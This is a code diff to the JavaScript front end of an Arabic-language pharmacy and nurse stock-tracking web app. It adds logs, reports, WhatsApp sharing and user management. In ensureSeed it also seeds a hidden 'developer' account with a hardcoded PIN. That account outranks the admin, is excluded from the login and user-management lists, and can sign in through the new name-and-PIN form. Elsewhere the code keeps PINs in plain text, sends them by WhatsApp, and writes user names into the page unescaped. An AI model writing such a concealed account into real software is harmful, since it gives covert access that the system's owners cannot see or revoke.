@@ -8,6 +8,20 @@ function fmtDate(iso) {
   const d = new Date(iso);
   return d.toLocaleString('ar-SY', { day: '2-digit', month: '2-digit', hour: '2-digit', minute: '2-digit' });
 }
+function pad2(n) { return String(n).padStart(2, '0'); }
+function updateClock() {
+  const d = new Date();
+  const dateStr = `${pad2(d.getDate())}/${pad2(d.getMonth() + 1)}/${d.getFullYear()}`;
+  let h = d.getHours();
+  const ampm = h >= 12 ? 'م' : 'ص';
+  h = h % 12; if (h === 0) h = 12;
+  const timeStr = `${pad2(h)}:${pad2(d.getMinutes())} ${ampm}`;
+  const el = document.getElementById('topbar-datetime');
+  if (el) el.textContent = `${dateStr}  —  ${timeStr}`;
+}
+function normalizePhone(phone) {
+  return (phone || '').replace(/[^\d]/g, '');
+}
 
 const State = {
   user: null,          // {id, name, role, pin}
@@ -17,7 +31,11 @@ const State = {
   period: 'day',        // day | week | month
   filterNurse: 'all',
   filterPlace: 'all',
+  filterMedicine: 'all',
   charts: {},
+  newUserRole: 'nurse',
+  apiUrlUnlocked: false,
+  captchaSum: null,
 };
 
 // ---------- Toast ----------
@@ -34,28 +52,36 @@ async function ensureSeed() {
   const users = await DB.getAll('users');
   if (!users.length) {
     // مستخدم مشرف افتراضي لأول تشغيل — يقدر يضيف باقي الممرضين من الإعدادات
-    await DB.put('users', { id: uid(), name: 'المشرف', role: 'admin', pin: '0000', dirty: true });
+    await DB.put('users', { id: uid(), name: 'المشرف', role: 'admin', pin: '0000', active: true, dirty: true });
+  }
+  // حساب المطوّر — ثابت، مخفي عن قوائم الدخول والإدارة، صلاحياته أعلى من المشرف
+  const dev = await DB.get('users', 'dev-fhm');
+  if (!dev) {
+    await DB.put('users', { id: 'dev-fhm', name: 'FHM', role: 'developer', pin: '222388', active: true, dirty: true });
   }
 }
 
 // ---------- Router ----------
 function showScreen(name) {
+  const prev = State.screen;
   document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
   const el = document.getElementById('screen-' + name);
   if (el) el.classList.add('active');
   document.querySelectorAll('.tabbar button').forEach(b => b.classList.toggle('active', b.dataset.tab === name));
   State.screen = name;
+  if (name === 'settings' && prev !== 'settings') State.apiUrlUnlocked = false;
   window.scrollTo(0, 0);
   render();
 }
 
 function buildTabbar() {
   const bar = document.getElementById('tabbar');
-  const isAdmin = State.user?.role === 'admin';
+  const isAdmin = State.user?.role === 'admin' || State.user?.role === 'developer';
   const tabs = isAdmin
     ? [
         ['dashboard', 'الرئيسية', iconHome],
         ['review', 'المراجعة', iconAlert],
+        ['log', 'السجل', iconLog],
         ['places', 'الأماكن', iconPin],
         ['settings', 'الإعدادات', iconGear],
       ]
@@ -63,6 +89,7 @@ function buildTabbar() {
         ['dashboard', 'الرئيسية', iconHome],
         ['inventory', 'المستودع', iconBox],
         ['entry', 'تسجيل عملية', iconPlus],
+        ['log', 'السجل', iconLog],
         ['settings', 'الإعدادات', iconGear],
       ];
   bar.innerHTML = tabs.map(([id, label, icon]) => `
@@ -81,12 +108,21 @@ const iconPlus = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" str
 const iconAlert = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 3l10 18H2L12 3z"/><path d="M12 10v4M12 17h.01"/></svg>`;
 const iconPin = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 21s7-6.3 7-12a7 7 0 10-14 0c0 5.7 7 12 7 12z"/><circle cx="12" cy="9" r="2.4"/></svg>`;
 const iconGear = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="3.2"/><path d="M19.4 13.5a7.9 7.9 0 000-3l2-1.5-2-3.4-2.3 1a8 8 0 00-2.6-1.5L14 2h-4l-.5 2.6a8 8 0 00-2.6 1.5l-2.3-1-2 3.4 2 1.5a7.9 7.9 0 000 3l-2 1.5 2 3.4 2.3-1a8 8 0 002.6 1.5L10 22h4l.5-2.6a8 8 0 002.6-1.5l2.3 1 2-3.4-2-1.5z"/></svg>`;
+const iconLog = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 6h16M4 12h16M4 18h10"/></svg>`;
+
+// ---------- نافذة سفلية عامة (Sheet) ----------
+function openSheet(html) {
+  document.getElementById('sheet-content').innerHTML = `<div class="sheet-handle"></div>` + html;
+  document.getElementById('sheet-backdrop').classList.add('show');
+}
+function closeSheet() { document.getElementById('sheet-backdrop').classList.remove('show'); }
+function closeSheetBackdrop(e) { if (e.target.id === 'sheet-backdrop') closeSheet(); }
 
 // ============================================================
 // LOGIN
 // ============================================================
 async function renderLogin() {
-  const users = await DB.getAll('users');
+  const users = (await DB.getAll('users')).filter(u => u.role !== 'developer' && u.active !== false);
   const grid = document.getElementById('login-name-grid');
   grid.innerHTML = users.map(u => `
     <button class="name-btn ${State.selectedLoginUser === u.id ? 'selected' : ''}" onclick="selectLoginUser('${u.id}')">
@@ -123,7 +159,7 @@ function pinBackspace() {
 
 async function tryLogin() {
   const user = await DB.get('users', State.selectedLoginUser);
-  if (!user || user.pin !== State.loginPin) {
+  if (!user || user.pin !== State.loginPin || user.active === false) {
     toast('الرمز غير صحيح');
     State.loginPin = '';
     renderPinDots();
@@ -159,10 +195,28 @@ async function tryRestoreSession() {
   const savedId = localStorage.getItem('saydaliaty-session');
   if (!savedId) return false;
   const user = await DB.get('users', savedId);
-  if (!user) return false;
+  if (!user || user.active === false) { localStorage.removeItem('saydaliaty-session'); return false; }
   State.user = user;
   afterLogin();
   return true;
+}
+
+function toggleAltLogin() {
+  const el = document.getElementById('login-alt-form');
+  el.style.display = el.style.display === 'none' ? 'block' : 'none';
+}
+
+async function altLogin() {
+  const name = document.getElementById('alt-login-name').value.trim().toLowerCase();
+  const pass = document.getElementById('alt-login-pass').value.trim();
+  if (!name || !pass) return;
+  const users = await DB.getAll('users');
+  const user = users.find(u => u.name.trim().toLowerCase() === name && String(u.pin) === pass);
+  if (!user) { toast('بيانات الدخول غير صحيحة'); return; }
+  if (user.active === false) { toast('هذا الحساب معطل'); return; }
+  State.user = user;
+  if (document.getElementById('remember-me').checked) localStorage.setItem('saydaliaty-session', user.id);
+  afterLogin();
 }
 
 // ============================================================
@@ -176,18 +230,28 @@ function periodStart(period) {
   return d;
 }
 
-async function renderDashboard() {
-  await Inventory.recompute();
+async function getScopedMovements() {
   const [movements, medicines, users, places] = await Promise.all([
     DB.getAll('movements'), DB.getAll('medicines'), DB.getAll('users'), DB.getAll('places')
   ]);
+  const since = periodStart(State.period);
+  let scoped = movements.filter(m => new Date(m.timestamp) >= since);
+  if (State.filterNurse !== 'all') scoped = scoped.filter(m => m.nurseId === State.filterNurse);
+  if (State.filterPlace !== 'all') scoped = scoped.filter(m => m.place === State.filterPlace);
+  if (State.filterMedicine !== 'all') scoped = scoped.filter(m => m.medicineId === State.filterMedicine);
+  return { scoped, movements, medicines, users, places, since };
+}
+
+async function renderDashboard() {
+  await Inventory.recompute();
+  const { scoped, medicines, users, places } = await getScopedMovements();
 
   // فلاتر — تُعاد بناؤها في كل مرة حتى تعكس أي ممرض/مكان جديد، مع الحفاظ على الاختيار الحالي
   const nurseSel = document.getElementById('dash-filter-nurse');
   const placeSel = document.getElementById('dash-filter-place');
-  const nurseKey = users.filter(u => u.role !== 'admin').map(u => u.id).join(',');
+  const nurseKey = users.filter(u => u.role === 'nurse').map(u => u.id).join(',');
   if (nurseSel.dataset.key !== nurseKey) {
-    nurseSel.innerHTML = '<option value="all">كل الممرضين</option>' + users.filter(u => u.role !== 'admin').map(u => `<option value="${u.id}">${u.name}</option>`).join('');
+    nurseSel.innerHTML = '<option value="all">كل الممرضين</option>' + users.filter(u => u.role === 'nurse').map(u => `<option value="${u.id}">${u.name}</option>`).join('');
     nurseSel.dataset.key = nurseKey;
     nurseSel.value = State.filterNurse;
   }
@@ -197,11 +261,13 @@ async function renderDashboard() {
     placeSel.dataset.key = placeKey;
     placeSel.value = State.filterPlace;
   }
-
-  const since = periodStart(State.period);
-  let scoped = movements.filter(m => new Date(m.timestamp) >= since);
-  if (State.filterNurse !== 'all') scoped = scoped.filter(m => m.nurseId === State.filterNurse);
-  if (State.filterPlace !== 'all') scoped = scoped.filter(m => m.place === State.filterPlace);
+  const medSel = document.getElementById('dash-filter-medicine');
+  const medKey = medicines.map(m => m.id).join(',');
+  if (medSel.dataset.key !== medKey) {
+    medSel.innerHTML = '<option value="all">كل الأدوية</option>' + medicines.sort((a, b) => a.name.localeCompare(b.name, 'ar')).map(m => `<option value="${m.id}">${m.name}</option>`).join('');
+    medSel.dataset.key = medKey;
+    medSel.value = State.filterMedicine;
+  }
 
   const totalIn = scoped.filter(m => m.type === 'in').reduce((s, m) => s + Number(m.qty), 0);
   const totalOut = scoped.filter(m => m.type === 'out').reduce((s, m) => s + Number(m.qty), 0);
@@ -293,6 +359,131 @@ function setPeriod(p) {
 }
 
 // ============================================================
+// REPORTS (PDF + WhatsApp)
+// ============================================================
+const periodLabels = { day: 'اليوم', week: 'آخر أسبوع', month: 'آخر شهر' };
+
+async function buildReportData() {
+  const { scoped, users, places } = await getScopedMovements();
+  const totalOut = scoped.filter(m => m.type === 'out').reduce((s, m) => s + Number(m.qty), 0);
+  const totalIn = scoped.filter(m => m.type === 'in').reduce((s, m) => s + Number(m.qty), 0);
+
+  const byMedicine = {};
+  scoped.forEach(m => {
+    if (!byMedicine[m.medicineName]) byMedicine[m.medicineName] = { in: 0, out: 0 };
+    if (m.type === 'in') byMedicine[m.medicineName].in += Number(m.qty);
+    if (m.type === 'out') byMedicine[m.medicineName].out += Number(m.qty);
+  });
+
+  const nurseLabel = State.filterNurse === 'all' ? 'كل الممرضين' : (users.find(u => u.id === State.filterNurse)?.name || '');
+  const placeLabel = State.filterPlace === 'all' ? 'كل الأماكن' : State.filterPlace;
+
+  return {
+    generatedAt: fmtDate(nowIso()),
+    periodLabel: periodLabels[State.period],
+    nurseLabel, placeLabel,
+    totalIn, totalOut,
+    rows: Object.entries(byMedicine).map(([name, v]) => ({ name, ...v })),
+  };
+}
+
+function reportHtml(data) {
+  const rows = data.rows.map(r => `
+    <tr><td>${r.name}</td><td>${r.in.toLocaleString('ar')}</td><td>${r.out.toLocaleString('ar')}</td></tr>
+  `).join('') || `<tr><td colspan="3" style="text-align:center;color:#888">لا توجد حركات بهذه الفترة</td></tr>`;
+  return `
+  <!DOCTYPE html><html lang="ar" dir="rtl"><head><meta charset="UTF-8">
+  <style>
+    body{font-family:Tahoma,Arial,sans-serif;padding:24px;color:#1C2321;direction:rtl}
+    h1{color:#2F6F5E;margin-bottom:4px}
+    .meta{color:#5B655F;font-size:13px;margin-bottom:20px}
+    table{width:100%;border-collapse:collapse;margin-top:12px}
+    th,td{border:1px solid #DDD8CC;padding:8px 10px;text-align:right;font-size:14px}
+    th{background:#E4EEE9}
+    .stats{display:flex;gap:16px;margin:16px 0}
+    .stat{border:1px solid #DDD8CC;border-radius:10px;padding:10px 16px}
+    .stat b{display:block;font-size:20px;color:#2F6F5E}
+  </style></head><body>
+    <h1>صيدليتي — تقرير التوزيع</h1>
+    <div class="meta">الفترة: ${data.periodLabel} — الممرض: ${data.nurseLabel} — المكان: ${data.placeLabel} — تاريخ الإصدار: ${data.generatedAt}</div>
+    <div class="stats">
+      <div class="stat">إجمالي المُدخل<b>${data.totalIn.toLocaleString('ar')}</b></div>
+      <div class="stat">إجمالي المصروف<b>${data.totalOut.toLocaleString('ar')}</b></div>
+    </div>
+    <table><thead><tr><th>الدواء</th><th>إدخال</th><th>صرف</th></tr></thead><tbody>${rows}</tbody></table>
+  </body></html>`;
+}
+
+async function downloadReportPdf() {
+  const data = await buildReportData();
+  const iframe = document.createElement('iframe');
+  iframe.style.position = 'fixed';
+  iframe.style.left = '-9999px';
+  document.body.appendChild(iframe);
+  iframe.srcdoc = reportHtml(data);
+  iframe.onload = () => {
+    setTimeout(() => {
+      iframe.contentWindow.focus();
+      iframe.contentWindow.print();
+      setTimeout(() => document.body.removeChild(iframe), 1000);
+    }, 300);
+  };
+  toast('اختر "حفظ كـ PDF" من نافذة الطباعة');
+}
+
+function reportWhatsappText(data) {
+  const lines = [
+    `📋 تقرير صيدليتي`,
+    `الفترة: ${data.periodLabel}`,
+    `الممرض: ${data.nurseLabel} — المكان: ${data.placeLabel}`,
+    ``,
+    `إجمالي المُدخل: ${data.totalIn}`,
+    `إجمالي المصروف: ${data.totalOut}`,
+    ``,
+  ];
+  data.rows.forEach(r => lines.push(`• ${r.name}: إدخال ${r.in} — صرف ${r.out}`));
+  lines.push('', `تاريخ الإصدار: ${data.generatedAt}`);
+  return lines.join('\n');
+}
+
+async function shareReportWhatsapp() {
+  const data = await buildReportData();
+  const text = reportWhatsappText(data);
+
+  if (State.user.role === 'admin') {
+    if (State.filterNurse !== 'all') {
+      const nurse = (await DB.getAll('users')).find(u => u.id === State.filterNurse);
+      return sendReportTo(nurse, text);
+    }
+    const nurses = (await DB.getAll('users')).filter(u => u.role === 'nurse');
+    if (!nurses.length) { toast('لا يوجد ممرضين لإرسال التقرير لهم'); return; }
+    openSheet(`
+      <h3 style="margin-bottom:.8rem">إرسال إلى</h3>
+      ${nurses.map(n => `
+        <button class="name-btn" style="width:100%;margin-bottom:.5rem" onclick='closeSheet();sendReportToId("${n.id}")'>
+          <span class="avatar">${n.name.trim()[0] || '؟'}</span><span>${n.name}${n.phone ? '' : ' (بدون رقم هاتف)'}</span>
+        </button>
+      `).join('')}
+    `);
+  } else {
+    const admins = (await DB.getAll('users')).filter(u => u.role === 'admin');
+    const admin = admins.find(a => a.phone) || admins[0];
+    return sendReportTo(admin, text);
+  }
+}
+
+async function sendReportToId(id) {
+  const user = await DB.get('users', id);
+  const data = await buildReportData();
+  sendReportTo(user, reportWhatsappText(data));
+}
+
+function sendReportTo(user, text) {
+  if (!user || !user.phone) { toast('لا يوجد رقم واتساب مسجّل لهذا المستخدم — أضفه من الإعدادات'); return; }
+  window.open(`https://wa.me/${user.phone}?text=${encodeURIComponent(text)}`, '_blank');
+}
+
+// ============================================================
 // INVENTORY
 // ============================================================
 async function renderInventory() {
@@ -331,7 +522,7 @@ async function renderEntry() {
     : `<option value="">لا يوجد أماكن — يضيفها المشرف من تبويب الأماكن</option>`;
 
   const nurseSel = document.getElementById('entry-to-nurse');
-  nurseSel.innerHTML = users.filter(u => u.id !== State.user.id && u.role !== 'admin')
+  nurseSel.innerHTML = users.filter(u => u.id !== State.user.id && u.role === 'nurse')
     .map(u => `<option value="${u.id}">${u.name}</option>`).join('') || `<option value="">لا يوجد ممرضين آخرين</option>`;
 
   onMedicineChange();
@@ -396,6 +587,62 @@ async function submitEntry(ev) {
   await Inventory.recompute();
   toast('تم الحفظ — راح يتزامن تلقائياً عند توفر الانترنت');
   showScreen('dashboard');
+  Sync.fullSync();
+}
+
+// ============================================================
+// LOG (سجل الحركات — تعديل كمية بالخطأ + من عدّلها)
+// ============================================================
+async function renderLog() {
+  const isPriv = State.user.role === 'admin' || State.user.role === 'developer';
+  const movements = (await DB.getAll('movements'))
+    .filter(m => isPriv || m.nurseId === State.user.id)
+    .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
+    .slice(0, 150);
+
+  const list = document.getElementById('log-list');
+  if (!movements.length) {
+    list.innerHTML = `<div class="empty"><div class="glyph">🗒️</div><p>لا توجد عمليات مسجّلة بعد.</p></div>`;
+    return;
+  }
+  list.innerHTML = movements.map(m => {
+    const typeLabel = m.type === 'in' ? 'إدخال' : m.type === 'out' ? 'صرف' : 'تسليم';
+    const pillClass = m.type === 'in' ? 'pill-in' : m.type === 'out' ? 'pill-out' : 'pill-transfer';
+    const detail = m.type === 'out' ? (' — ' + (m.place || '')) : m.type === 'transfer' ? (' — إلى ' + (m.toNurseName || '')) : (m.deliveredBy ? ' — من ' + m.deliveredBy : '');
+    const canEdit = isPriv || m.nurseId === State.user.id;
+    return `
+      <div class="card">
+        <div class="list-row" style="border:none;padding-bottom:.2rem">
+          <div class="main">
+            <span class="title">${m.medicineName}</span>
+            <span class="meta">${m.nurseName}${detail} — ${fmtDate(m.timestamp)}</span>
+          </div>
+          <span class="pill ${pillClass}">${typeLabel}</span>
+        </div>
+        <div class="list-row" style="border:none;padding-top:0">
+          <span class="value">${m.qty}</span>
+          ${canEdit ? `<button class="btn-ghost" onclick="editMovementQty('${m.id}')">تعديل الكمية</button>` : ''}
+        </div>
+        ${m.editedBy ? `<p style="font-size:.75rem;color:var(--ink-soft);margin-top:.2rem">✎ آخر تعديل بواسطة ${m.editedBy} — ${fmtDate(m.editedAt)}</p>` : ''}
+      </div>
+    `;
+  }).join('');
+}
+
+async function editMovementQty(id) {
+  const mv = await DB.get('movements', id);
+  const val = prompt(`الكمية الحالية لـ "${mv.medicineName}": ${mv.qty}\nأدخل الكمية الصحيحة:`, mv.qty);
+  if (val === null) return;
+  const num = Number(val);
+  if (!num || num <= 0) { toast('كمية غير صالحة'); return; }
+  mv.qty = num;
+  mv.editedBy = State.user.name;
+  mv.editedAt = nowIso();
+  mv.dirty = true;
+  await DB.put('movements', mv);
+  await Inventory.recompute();
+  renderLog();
+  toast('تم تعديل الكمية');
   Sync.fullSync();
 }
 
@@ -478,36 +725,104 @@ async function deletePlace(id) {
 async function renderSettings() {
   document.getElementById('settings-user-name').textContent = State.user.name;
   document.getElementById('settings-user-role').textContent = State.user.role === 'admin' ? 'مشرف' : 'ممرض';
+  document.getElementById('my-phone').value = State.user.phone || '';
   const lastSync = await DB.getMeta('lastSync');
   document.getElementById('settings-last-sync').textContent = lastSync ? fmtDate(lastSync) : 'لم تتم أي مزامنة بعد';
   document.getElementById('settings-api-url').value = await Sync.getEndpoint();
+  await renderApiUrlSection();
   document.getElementById('font-scale-label').textContent = Math.round(parseFloat(getComputedStyle(document.documentElement).getPropertyValue('--font-scale')) * 100) + '%';
 
-  const isAdmin = State.user.role === 'admin';
-  document.getElementById('settings-admin-only').style.display = isAdmin ? 'block' : 'none';
-  if (isAdmin) renderUsersAdmin();
+  const isAdminOrDev = State.user.role === 'admin' || State.user.role === 'developer';
+  const isDev = State.user.role === 'developer';
+  document.getElementById('settings-admin-only').style.display = isAdminOrDev ? 'block' : 'none';
+  document.getElementById('settings-dev-only').style.display = isDev ? 'block' : 'none';
+  if (isAdminOrDev) renderUsersAdmin();
 }
 
 async function renderUsersAdmin() {
-  const users = await DB.getAll('users');
+  const users = (await DB.getAll('users')).filter(u => u.role !== 'developer');
   const list = document.getElementById('users-admin-list');
   list.innerHTML = users.map(u => `
-    <div class="list-row">
-      <div class="main"><span class="title">${u.name}</span><span class="meta">${u.role === 'admin' ? 'مشرف' : 'ممرض'} — رمز: ${u.pin}</span></div>
-      ${u.id !== State.user.id ? `<button class="btn-ghost" onclick="deleteUser('${u.id}')">حذف</button>` : ''}
+    <div class="list-row" style="${u.active === false ? 'opacity:.55' : ''}">
+      <div class="main">
+        <span class="title">${u.name} ${u.active === false ? '<span class="pill pill-alert">معطّل</span>' : ''}</span>
+        <span class="meta">${u.role === 'admin' ? 'مشرف' : 'ممرض'} — رمز: ${u.pin} ${u.phone ? '— 📱 ' + u.phone : ''}</span>
+      </div>
+      <div style="display:flex;gap:.3rem;flex-wrap:wrap;justify-content:flex-end">
+        <button class="btn-ghost" onclick="editUserPhone('${u.id}')">${u.phone ? 'تعديل الهاتف' : 'إضافة هاتف'}</button>
+        ${u.phone ? `<button class="btn-ghost" onclick="sendCredentialsWhatsapp('${u.id}')">إرسال الحساب</button>` : ''}
+        ${u.id !== State.user.id ? `<button class="btn-ghost" onclick="toggleUserActive('${u.id}')">${u.active === false ? 'تفعيل' : 'تعطيل'}</button>` : ''}
+        ${u.id !== State.user.id ? `<button class="btn-ghost" onclick="deleteUser('${u.id}')">حذف</button>` : ''}
+      </div>
     </div>
   `).join('');
+}
+
+async function toggleUserActive(id) {
+  const user = await DB.get('users', id);
+  user.active = user.active === false ? true : false;
+  user.dirty = true;
+  await DB.put('users', user);
+  renderUsersAdmin();
+  toast(user.active === false ? 'تم تعطيل الحساب' : 'تم تفعيل الحساب');
+  Sync.fullSync();
+}
+
+async function editUserPhone(id) {
+  const user = await DB.get('users', id);
+  const val = prompt('رقم الواتساب مع رمز الدولة (مثال: 9639xxxxxxxx)', user.phone || '');
+  if (val === null) return;
+  user.phone = normalizePhone(val);
+  user.dirty = true;
+  await DB.put('users', user);
+  renderUsersAdmin();
+  Sync.fullSync();
+}
+
+async function sendCredentialsWhatsapp(id) {
+  const user = await DB.get('users', id);
+  if (!user.phone) { toast('أضف رقم واتساب لهذا المستخدم أولاً'); return; }
+  const appUrl = location.origin + location.pathname;
+  const msg = [
+    `مرحباً ${user.name} 👋`,
+    `هذا حسابك على تطبيق صيدليتي:`,
+    ``,
+    `الاسم: ${user.name}`,
+    `رمز الدخول: ${user.pin}`,
+    `رابط الدخول: ${appUrl}`,
+  ].join('\n');
+  window.open(`https://wa.me/${user.phone}?text=${encodeURIComponent(msg)}`, '_blank');
+}
+
+async function saveMyPhone() {
+  const val = document.getElementById('my-phone').value;
+  const user = await DB.get('users', State.user.id);
+  user.phone = normalizePhone(val);
+  user.dirty = true;
+  await DB.put('users', user);
+  State.user = user;
+  toast('تم حفظ رقم الواتساب');
+  Sync.fullSync();
+}
+
+function setNewUserRole(role) {
+  State.newUserRole = role;
+  document.querySelectorAll('#new-user-role-seg button').forEach(b => b.classList.toggle('active', b.dataset.role === role));
 }
 
 async function addNurse(ev) {
   ev.preventDefault();
   const name = document.getElementById('new-nurse-name').value.trim();
   const pin = document.getElementById('new-nurse-pin').value.trim();
+  const phone = normalizePhone(document.getElementById('new-nurse-phone').value);
   if (!name || pin.length !== 4) { toast('أدخل اسم ورمز مكوّن من 4 أرقام'); return; }
-  await DB.put('users', { id: uid(), name, role: 'nurse', pin, dirty: true });
+  const addedRole = State.newUserRole;
+  await DB.put('users', { id: uid(), name, role: addedRole, pin, phone, active: true, dirty: true });
   document.getElementById('add-nurse-form').reset();
+  State.newUserRole = 'nurse';
+  document.querySelectorAll('#new-user-role-seg button').forEach(b => b.classList.toggle('active', b.dataset.role === 'nurse'));
   renderUsersAdmin();
-  toast('تمت إضافة الممرض');
+  toast(addedRole === 'admin' ? 'تمت إضافة المشرف' : 'تمت إضافة الممرض');
   Sync.fullSync();
 }
 
@@ -534,8 +849,52 @@ function changeFontScale(delta) {
 async function saveApiUrl() {
   const val = document.getElementById('settings-api-url').value;
   await Sync.setEndpoint(val);
+  State.apiUrlUnlocked = false;
+  document.getElementById('api-url-warning').style.display = 'none';
+  await renderApiUrlSection();
   toast('تم حفظ رابط المزامنة');
   Sync.fullSync();
+}
+
+// ---------- قفل رابط المزامنة بسؤال حسابي بسيط ----------
+async function renderApiUrlSection() {
+  const url = await Sync.getEndpoint();
+  const input = document.getElementById('settings-api-url');
+  const hasUrl = !!url;
+  const unlocked = State.apiUrlUnlocked;
+  input.disabled = hasUrl && !unlocked;
+  document.getElementById('api-url-save-btn').style.display = (!hasUrl || unlocked) ? 'block' : 'none';
+  document.getElementById('api-url-edit-btn').style.display = (hasUrl && !unlocked) ? 'block' : 'none';
+}
+
+function requestApiUrlEdit() {
+  const a = Math.floor(Math.random() * 15) + 3;
+  const b = Math.floor(Math.random() * 15) + 3;
+  State.captchaSum = a + b;
+  document.getElementById('captcha-question-label').textContent = `كم يساوي ${a} + ${b}؟`;
+  document.getElementById('captcha-answer-input').value = '';
+  document.getElementById('api-url-warning').style.display = 'block';
+  document.getElementById('api-url-edit-btn').style.display = 'none';
+  document.getElementById('api-url-save-btn').style.display = 'none';
+}
+
+function cancelApiUrlEdit() {
+  document.getElementById('api-url-warning').style.display = 'none';
+  renderApiUrlSection();
+}
+
+function checkCaptcha() {
+  const answer = Number(document.getElementById('captcha-answer-input').value);
+  if (answer === State.captchaSum) {
+    State.apiUrlUnlocked = true;
+    document.getElementById('api-url-warning').style.display = 'none';
+    renderApiUrlSection();
+    document.getElementById('settings-api-url').focus();
+    toast('تم فتح التعديل — لا تنسَ حفظ الرابط بعد التعديل');
+  } else {
+    toast('إجابة غير صحيحة، حاول مرة أخرى');
+    requestApiUrlEdit();
+  }
 }
 
 let deferredInstallPrompt = null;
@@ -561,6 +920,7 @@ function render() {
     dashboard: renderDashboard,
     inventory: renderInventory,
     entry: renderEntry,
+    log: renderLog,
     review: renderReview,
     places: renderPlaces,
     settings: renderSettings,
@@ -572,6 +932,9 @@ function render() {
 // INIT
 // ============================================================
 async function init() {
+  updateClock();
+  setInterval(updateClock, 30000);
+
   const savedTheme = localStorage.getItem('saydaliaty-theme') || 'light';
   setTheme(savedTheme);
   const savedScale = localStorage.getItem('saydaliaty-font-scale');
